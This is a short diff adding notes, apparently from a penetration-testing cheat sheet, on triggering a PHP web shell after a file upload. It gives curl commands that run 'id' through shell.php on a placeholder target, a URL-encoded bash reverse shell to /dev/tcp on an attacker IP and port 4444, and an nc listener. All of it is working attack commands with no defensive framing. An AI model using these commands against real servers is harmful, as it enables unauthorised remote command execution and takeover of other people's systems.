@@ -1,0 +1,7 @@
+TRIGGER SHELL
+bash# After upload, find where file is stored then:
+curl "http://target.com/uploads/shell.php?cmd=id"
+curl "http://target.com/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/YOURIP/4444+0>%261"
+
+# Listener
+nc -lvnp 4444
